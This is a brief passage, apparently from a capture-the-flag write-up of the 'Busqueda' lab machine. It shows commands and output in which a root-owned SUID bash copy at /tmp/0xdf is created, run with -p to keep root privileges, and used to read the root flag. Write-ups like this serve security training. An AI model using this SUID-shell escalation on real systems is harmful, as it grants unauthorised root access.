@@ -1,0 +1,1 @@
+system-checkup.py full-checkup [+] Done! /tmp/0xdf is there, owned by root, and the s bit is on: svc@busqueda:/dev/shm$ ls -l /tmp/0xdf -rwsrwxrwx 1 root root 1396520 Mar 31 19:57 /tmp/0xdf I’ll run with -p to not drop privs : svc@busqueda:/dev/shm$ /tmp/0xdf -p 0xdf-5.1# And grab root.txt : 0xdf-5.1# cat root.txt e7df7cd2************************
